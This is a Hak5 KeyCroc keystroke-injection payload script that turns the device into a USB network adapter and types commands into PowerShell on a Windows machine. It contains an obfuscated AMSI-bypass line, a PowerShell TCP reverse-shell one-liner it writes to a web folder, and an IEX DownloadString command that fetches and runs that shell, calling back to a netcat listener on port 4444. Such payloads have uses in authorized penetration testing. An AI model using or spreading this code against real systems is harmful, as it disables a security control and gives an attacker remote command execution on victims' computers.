# Title: Powershell reverse shell to the KeyCroc
# Author: cerebro11 
# Date: 25/07/2020
# Following commands should be ran on the KeyCroc before running payload: 
#     1) "cd /tmp/www && python3 -m http.server &"
#     2) "nc -nvlp 4444"

MATCH __croc_revshell

# Step 1 : Change to ETHERNET ATTACKMODE (Windows)
VENDOR=$(cat /tmp/vidpid | cut -d: -f1)
PRODUCT=$(cat /tmp/vidpid | cut -d: -f2)
ATTACKMODE HID RNDIS_ETHERNET VID_0X$VENDOR PID_0X$PRODUCT
QUACK DELAY 5000

# Step 2 : Get KeyCroc's LAN IP
croc_ip=$(ifconfig usb0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)

# Step 3 : Inject KeyStrokes
QUACK GUI
QUACK DELAY 2
# 3.1 : Run Powershell
QUACK STRING "powershell.exe"
QUACK ENTER
QUACK DELAY 2
# 3.2 : Bypass AMSI
QUACK STRING "[Ref].Assembly.GetType('Sy'+'stem.Managem'+'ent.Aut'+'omation.Am'+'s'+'iUt'+'ils').GetField('a'+'m'+'si'+'In'+'itFa'+'iled','No'+'nPub'+'lic,Static').SetValue(\$null,\$true)"
QUACK ENTER
# 3.3 : Create TCP Revershell Oneliner file
mkdir /tmp/www
echo "\$client = New-Object System.Net.Sockets.TCPClient('${croc_ip}',4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" > /tmp/www/Invoke-PowerShellTcpOneLine.ps1
# 3.4 : Spawn Reverse Shell
QUACK STRING "IEX (New-Object Net.WebClient).DownloadString('http://${croc_ip}:8000/Invoke-PowerShellTcpOneLine.ps1');"
QUACK ENTER
